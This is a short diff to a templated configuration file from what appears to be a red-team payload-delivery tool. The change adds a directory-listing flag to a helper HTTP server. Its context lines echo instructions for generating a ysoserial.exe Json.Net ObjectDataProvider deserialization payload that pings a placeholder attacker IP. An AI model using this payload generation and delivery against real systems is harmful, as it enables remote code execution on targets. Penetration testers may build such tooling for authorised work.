@@ -18,4 +18,4 @@ content: |
   echo 'Expand Archive: Expand-Archive {{ delivery_path_windows }}\Release.zip -DestinationPath {{ delivery_path_windows }}\Release'; \
   echo 'Create PoC-Payload: {{ delivery_path_windows }}\Release\ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 {{ attacker_ip }}" -o base64'; \
   echo '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
